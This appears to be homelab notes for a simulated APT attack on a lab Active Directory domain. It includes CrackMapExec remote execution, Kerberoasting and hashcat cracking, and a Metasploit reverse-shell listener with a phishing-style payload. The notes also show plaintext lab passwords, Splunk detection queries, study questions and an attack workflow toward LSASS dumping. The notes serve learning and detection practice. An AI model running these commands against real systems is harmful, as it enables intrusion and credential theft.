# APT Project 
## Commands Used =>

```bash
# Copy file from one device to another (Windows -> Linux)
scp C:\path\to\file.txt user@linux-ip:/home/user/

# Linux -> Windows
scp /home/user/file.txt user@windows-ip:C:/Users/user/Desktop/

# RDP from Linux -> Windows (with specific resolution)
xfreerdp /v:192.168.0.104 /u:Administrator /p:atman@99 /w:1600 /h:900

```

```shell
crackmapexec smb <W10-IP> -u brown -p <password>
# Error: No reply when run the above command in Kali => Enabled File & Printer Sharing

crackmapexec smb <W10-IP> -u brown -p <password> -x “whoami”
```

```shell
# Check Access Level
crackmapexec smb 192.168.0.105 -u brown -p password@123 --shares 

# Enumerate domain users
crackmapexec smb 192.168.0.105 -u brown -p password@123 --users 

# Kerberoasting
impacket-GetUserSPNs homelab.local/brown:password@123 -dc-ip 192.168.0.104 -request
# Or
GetUserSPNs.py homelab.local/brown:password@123 -dc-ip 192.168.0.104 -request
```

```shell
# Crack password
nano kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# Validate access against Windows10
crackmapexec smb 192.168.0.105 -u svc_backup -p 'Summer2024!'

# Validate Access against DC
crackmapexec smb 192.168.0.104 -u svc_backup -p 'Summer2024!'

crackmapexec smb 192.168.0.104 -u svc_backup -p 'Summer2024!' --shares

crackmapexec smb 192.168.0.104 -u svc_backup -p 'Summer2024!' -x whoami


```





```shell
# Start the Metasploint Listener on Kali
msfconsole -q

# Then inside msfconsole:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.103
set LPORT 4444
set ExitOnSession false
run

# You should see:
[*] Started reverse TCP handler on 192.168.0.103:4444
```

```shell
# Execute it on Windows 10 (HL-WS01)(this is the "user clicked the phishing attachment" moment)
Start-Process "C:\Users\hr.brown\Downloads\update_service.exe"

# On Kali
Sessions -l

background
sessions -i 1
getuid

# In meterpreter — list all processes
ps

# Look for explorer.exe or svchost.exe running under hr.brown or SYSTEM
# Note the PID of explorer.exe (it will be hr.brown's desktop process)
# Example:
migrate 3452
```

```spl
index=wineventlog host=HL-DC01 EventCode=4624 
| search Account_Name="da_admin" OR Account_Name="Administrator"
| table _time, Account_Name, Logon_Type, Source_Network_Address
```

```spl
index=wineventlog host="HL-WS01" EventCode=4688
| rex field=Message "New Process Name:\s+(?<NewProcessName>[^\r\n]+)"
| rex field=Message "Account Name:\s+(?<SubjectUserName>[^\r\n]+)"
| search NewProcessName="*update_service*"
| table _time, ComputerName, NewProcessName, SubjectUserName
```

```spl
index=wineventlog_sysmon host="HL-WS01" EventCode=1
| search Image="*update_service*"
| table _time, Image, CommandLine, User, ParentImage
```

```spl
index=wineventlog_sysmon host="HL-WS01" EventCode=3
| search DestinationIp="192.168.0.103" DestinationPort=4444
| table _time, Image, DestinationIp, DestinationPort, User
```


## Questions


1. What is APT Style? (Advanced Persistent Threat)

is a covert cyber attack on a computer network where the attacker gains and maintains unauthorized access to the targeted network and remains undetected for a significant period.

2. Use of SMB?

CME remote command execution over SMB uses? WMI, SMBExec or PsExec Style techniques

3. What is LSASS?

LSASS, or Local Security Authority Subsystem Service, is a critical component of the Windows operating system responsible for enforcing security policies, handling user logins, and managing password changes.

4. NTLM Hashes?
5. What happens if I upload Mimikatz in the system?
6. What is Kerberoasting Attack?
7. What is SPN ?
8. Use of SPN ?
9. How do I know in the first place HR’s (Brown) username & password? Do I need to perform any special action to find that?
10. How do I know the DC and the Windows 10 PC IP addresses ?
11. What is the Crackmapexec tool in kali linux?
12. Use of Crackmapexec?
13. What is NTDS.dit?
14. What is Mimikatz?

## Work Flow

Compromise HR User -> Enumerate Shares -> Discover svc_backup -> Kerberoast -> Crack Password -> pivot -> Dump LSASS -> Escalate to Domain

